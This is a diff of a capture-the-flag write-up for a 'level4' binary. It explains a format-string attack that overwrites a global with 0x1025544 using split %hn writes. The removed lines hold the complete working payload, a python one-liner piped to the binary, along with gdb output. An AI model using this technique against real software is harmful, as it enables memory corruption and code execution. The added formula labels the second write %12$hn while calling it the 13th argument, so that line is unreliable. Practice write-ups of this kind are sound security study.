@@ -1,41 +1,31 @@
-save as before (format string) 
- 
+The <main> function makes a call to <n> function.
 
+$ (gdb) disas main
+...
+0x080484ad <+6>:	call   0x8048457 <n>
+...
 
-gdb gives us : 
-=> 0x804848d <n+54>:	mov    eax,ds:0x8049810
-   0x8048492 <n+59>:	cmp    eax,0x1025544
+The <n> function makes a call to <p> function which uses printf.
 
-so we need to replace the value in 0x8049810 with 0x1025544
+$ (gdb) disas n
+...
+0x08048488 <+49>:	call   0x8048444 <p>
+...
 
-to do that we need to split the add in 2 so it can fit in an integer 
+To get to the <system> call we need to pass the following check that compares
+the variable <m> to 0x1025544
 
-gives us : 
+0x0804848d <+54>:	mov    eax, ds:0x8049810
+0x08048492 <+59>:	cmp    eax, 0x1025544
 
-0x0102 = 258  at 0x8049812
-0x5544 = 21828 at 0x8049810
+This means we want to write 0x1025544 at 0x8049810.
+Playing around with printf we notice that we control the 12th argument on the stack.
+But, we cannot pipe 16930116 bytes at once so we split the value 0x1025544 into 0x0102 (258) and 0x5544 (21828)
 
-printf allows us to do 
-%5$n = %p%p%p%p%p%n 
-
-once the offset found : 
-%12$x
-we can write on this addr but with a short (%hn)
-
-$ python -c 'print  "\x08\x04\x98\x12"[::-1]+ "\x08\x04\x98\x10"[::-1]  + "%12$hn"
- in gdb : 
-0016| 0xbffff520 --> 0x8049812 --> 0x8 
-0020| 0xbffff524 --> 0x8049810 --> 0x80000 
-  
-we need to add (258 - 8) : %250d%12$hn
-0016| 0xbffff520 --> 0x8049812 --> 0x102 
-0020| 0xbffff524 --> 0x8049810 --> 0x1020000 
-yeah ! same way for 0x8049810...
-
-21828 - 8 - 250 = 21570 
- 
-add "%21570d%13hn" to the python line 
-And Voila ! 
-python -c 'print  "\x08\x04\x98\x12"[::-1]+ "\x08\x04\x98\x10"[::-1]  + "%250d%12$hn" + "%21570d%13$hn"   ' | ./level4 
-
-the tips is to 
+The formula is then :
+	<addr+2>		: for the high part of the target address
+	<addr>			: for the low part of the target address
+	<250(-8)>		: 0x0102 minus the 8 bytes of the 1st address
+	<%12$hn>		: write it at 1st address as 12th argument on the stack
+	<21828(-258)>	: 0x5544 minus the 258 bytes already printed
+	<%12$hn>		: write it at 2nd address as 13th argument on the stack
